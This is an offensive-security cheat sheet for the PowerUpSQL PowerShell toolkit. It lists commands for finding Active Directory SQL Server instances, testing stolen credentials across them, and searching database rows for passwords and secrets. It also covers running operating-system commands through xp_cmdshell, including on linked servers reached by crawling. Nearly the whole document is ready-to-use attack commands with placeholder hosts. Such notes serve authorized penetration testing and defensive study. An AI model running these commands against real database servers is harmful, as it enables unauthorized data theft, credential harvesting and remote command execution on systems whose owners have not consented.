### source
https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1  

### discover active directory domain SQL server
```
Get-SQLInstanceDomain -Verbose | Get-SQLServerinfo -Verbose
```

### list accessible SQL server using credentials
```
Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username <user> -password <password> | Where-Object {$_.Status -like "Accessible"}
```

### get information from specific instance
```
Get-Sqlserverinfo -instance <rhost>
```

### scan for misconfiguration
```
Invoke-sqlaudit -instance <rhost>
```

### search database rows for specific keywords (NoDefaults skip default tables)
```
Get-SQLColumnSampleData –Verbose –Keyword "secret,password" –SampleSize 10 –NoDefaults -Instance <rhost>
```

### execute command
```
Invoke-SQLOSCmd -Instance '<rhost>,1433' -Command '<command>' -RawResults
```

### execute query
```
Get-SQLQuery -Instance '<rhost>,1433' -Query 'SELECT * FROM master..sysservers'
```

### scan for linked databases
```
Get-SQLServerLinkCrawl -Instance '<rhost>,1433'
```

### execute commands on linked instances
```
Get-SQLServerLinkCrawl -Instance <rhost> -Query "exec master..xp_cmdshell '<command>'"
```

### excute command on linked mssql instance via rhost (xp_cmdshell can not be enabled by OpenQuery)
```
Get-SQLServerLinkCrawl -Instance '<rhost>,1433' -Query "exec master..xp_cmdshell '<command>' "
```

